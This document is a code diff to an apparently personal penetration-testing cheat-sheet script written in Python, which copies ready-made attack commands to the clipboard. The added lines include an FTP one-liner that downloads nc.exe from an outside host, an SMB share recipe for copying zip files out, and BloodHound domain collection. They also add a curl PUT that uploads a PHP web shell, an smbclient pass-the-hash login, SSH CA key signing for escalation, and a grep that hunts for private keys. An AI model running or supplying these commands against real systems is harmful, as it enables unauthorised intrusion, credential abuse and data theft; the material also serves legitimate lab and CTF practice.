@@ -19,7 +19,27 @@ local_port = args.lp
 target_ip = args.target
 store_directory = args.d
 
-"""
+r"""
+To be implemented:
+cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -recent_docs > G:\Netwars\Analysis\recent_docs_vibranium.csv
+cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -search_history > G:\Netwars\Analysis\search_history_vibranium.csv
+cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -opensave_mru > G:\Netwars\Analysis\opensave_mru_vibranium.csv
+cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -userassist > G:\Netwars\Analysis\userassist_vibranium.csv
+
+LECmd.exe -d "E:\[root]\Users\vibranium\AppData\Roaming\Microsoft\Windows\Recent" --csv "G:\Netwars\Analysis\Shellitems_vibranium" -q
+SBECmd.exe -d "E:\[root]\Users\vibranium\AppData\Local\Microsoft\Windows" --csv "G:\Netwars\Analysis" -q
+PECmd.exe -d "E:\[root]\Windows\Prefetch" -q --csv G:\Netwars\Analysis
+
+C:\"Forensic Program Files"\Python\ShimCacheParser.py -i SYSTEM -o G:\Netwars\Analysis\shimcache_vibranium.csv
+
+//Transfer file
+on client: net use z: \\10.10.14.17\share
+on server: impacket-smbserver share `pwd`
+on client: copy *.zip z:
+
+Invoke-Bloodhound -CollectionMethod All
+
+(for %t in ("open 10.1.1.110 21" ftp bin "GET nc.exe" bye) do @echo %~t) >ftp.txt&&ftp -s:ftp.txt
 netstat -alnp
 Eliminate the / at the end of directory
 """
@@ -103,20 +123,20 @@ def nmap():
     copy_to_clipboard(options)
 
 def hydra():
-    print("Please enter the path to the login form")
+    print('Please enter the path to the login form. For example: 10.10.10.9/login.php. Enter "login.php"')
     path = get_url()
+    if path[0] != "/":
+        path = "/" + path
 
-    print("Please enter request from burp.")
+    print('Please enter request from burp (^USER^ and ^PASS^")')
     request = get_url()
-    if request[-1] != "/":
-        request = "/" + request
 
-    print("Please enter user list location")
+    print("Please enter user list location. Leave blank for /mnt/hgfs/Pentest/password_cracking/top_usernames.txt")
     user_list = input("Input: ").strip()
     if user_list == "":
         user_list = "/mnt/hgfs/Pentest/password_cracking/top_usernames.txt"
 
-    print("Please enter password list location")
+    print("Please enter password list location. Leave blank for /mnt/hgfs/Pentest/password_cracking/darkweb2017-top10000.txt")
     pass_list = input("Input: ").strip()
     if pass_list == "":
         pass_list = "/mnt/hgfs/Pentest/password_cracking/darkweb2017-top10000.txt"
@@ -139,7 +159,7 @@ def gobuster():
     if url == "":
         url = target_ip
 
-    print("Please enter word list location (Default: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt). Leave blank to use default")
+    print("Please enter word list location (Leave blank for default: directory-list-2.3-medium.txt). Others: /mnt/hgfs/Pentest/word_lists/list.txt")
     word_list = input("Input: ").strip()
     if word_list == "":
         word_list = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
@@ -184,6 +204,7 @@ def curl():
         2 : ["Upload file with PUT option", f"""curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' {url}"""],
         3 : ["Grab Headers and spoof user agent", f"""curl -I -X HEAD -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" {url}"""],
         4 : ["Scrape site after login", f"""curl -u user:pass -o outfile {url}"""],
+        5 : ["Read local file", f"""curl file:///path/to/file"""],
     }
     
     copy_to_clipboard(options)
@@ -250,6 +271,7 @@ def smbclient():
         2 : ["Sample usage 2", f'smbclient "\\\\\\{var}{target_ip}\<sharename>"'],
         3 : ["Sample usage 3", f'smbclient -U <username> //{target_ip}/<sharename>'],
         4 : ["Sample usage 4", f'smbclient //MOUNT/<sharename> -I {target_ip} -N'],
+        5: ["Sample usage 5", f'smbclient -U <username>%<hash> --pw-nt-hash -L {target_ip}'],
     }
     
     copy_to_clipboard(options)
@@ -465,6 +487,23 @@ def snmp():
     
     copy_to_clipboard(options)
 
+def others():
+    options = {1 : ["Check changes in file", f"""watch -n 1 <command>"""],
+        2 : ["Check running scripts", f"""systemctl list-timers --all"""],
+        3 : ["Copy with scp", f"""scp -P 22 dave@{target_ip}:/home/dave /tmp"""],
+        4 : ["Sign with ca private key", f"""/usr/bin/ssh-keygen -s /home/userca/ca -I key_id -n [principal_name] /tmp/key.pub"""],
+        5 : ["Login with signed pub key", f"""ssh -i key-cert.pub -i key [principal_name]@localhost"""],
+    }
+    
+    copy_to_clipboard(options)
+
+def grep():
+    options = {1 : ["Grep example 1", f"""grep -rnw '/' -e 'PRIVATE' 2>/dev/null"""],
+        2 : ["Grep example 2", f"""grep -Ril "nina" 2>/dev/null """],
+    }
+    
+    copy_to_clipboard(options)
+
 def linux():
     options = {1 : ["Service", f"/etc/init.d"],
         2 : ["Network configuration", "/etc/network/interfaces"],
@@ -558,6 +597,8 @@ options = {"nmap" : nmap,
            "merlin" : merlin,
            "socat" : socat,
            "snmp" : snmp,
+           "others": others,
+           "grep": grep,
 }
 
 systems = {"windows" : windows, "linux" : linux}
